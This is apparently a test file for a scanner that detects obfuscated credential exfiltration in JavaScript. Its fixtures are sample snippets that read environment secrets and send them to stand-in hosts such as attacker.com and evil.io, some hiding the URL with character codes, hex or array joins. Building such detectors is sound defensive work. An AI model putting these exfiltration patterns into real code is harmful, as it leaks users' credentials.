/**
 * Test cases for obfuscated credential exfiltration detection
 * Issue: #1 - Detect obfuscated credential exfiltration patterns
 */

import { detectObfuscatedExfiltration } from './src/obfuscated-exfil';

const TEST_CASES = [
  {
    name: 'Base64 encoded URL exfiltration',
    code: `
const key = process.env.API_KEY;
const encoded = atob(key);
fetch('https://attacker.com/exfil/' + encoded);
`,
    expectedFindings: 2,
    expectedSeverity: 'critical'
  },
  {
    name: 'CharCode URL construction',
    code: `
const url = String.fromCharCode(104,116,116,112,115,58,47,47);
fetch(url + 'attacker.com/data');
`,
    expectedFindings: 1,
    expectedSeverity: 'critical'
  },
  {
    name: 'Buffer hex exfiltration',
    code: `
const data = process.env.SECRET;
const hex = Buffer.from(data).toString('hex');
fetch('https://evil.io/post?d=' + hex);
`,
    expectedFindings: 2,
    expectedSeverity: 'critical'
  },
  {
    name: 'Environment variable concatenation',
    code: `
const token = process.env.GITHUB_TOKEN;
fetch('https://api.github.com/repos/' + owner + '/' + repo, {
  headers: { 'Authorization': 'Bearer ' + token }
});
`,
    expectedFindings: 1,
    expectedSeverity: 'high'
  },
  {
    name: 'Template literal with ENV',
    code: `
const secret = process.env.API_SECRET;
fetch(\`https://analytics.io/track?data=\${secret}\`);
`,
    expectedFindings: 1,
    expectedSeverity: 'high'
  },
  {
    name: 'Array join obfuscation',
    code: `
const parts = ['attacker', 'com'];
const domain = parts.join('.');
fetch('https://' + domain + '/exfil');
`,
    expectedFindings: 0, // Array join without ENV
    expectedSeverity: 'none'
  },
  {
    name: 'Legitimate API call - NOT exfiltration',
    code: `
const response = await fetch('https://api.example.com/data', {
  headers: { 'Content-Type': 'application/json' }
});
`,
    expectedFindings: 0,
    expectedSeverity: 'none'
  }
];

console.log('Running obfuscated exfiltration detection tests...\n');

let passed = 0;
let failed = 0;

for (const test of TEST_CASES) {
  const result = detectObfuscatedExfiltration(test.code);
  const hasFindings = result.findings.length > 0;
  
  if ((test.expectedFindings > 0 && hasFindings) || 
      (test.expectedFindings === 0 && !hasFindings)) {
    console.log(`✓ ${test.name}`);
    passed++;
  } else {
    console.log(`✗ ${test.name}`);
    console.log(`  Expected ${test.expectedFindings} findings, got ${result.findings.length}`);
    console.log(`  Findings: ${JSON.stringify(result.findings)}`);
    failed++;
  }
}

console.log(`\nResults: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
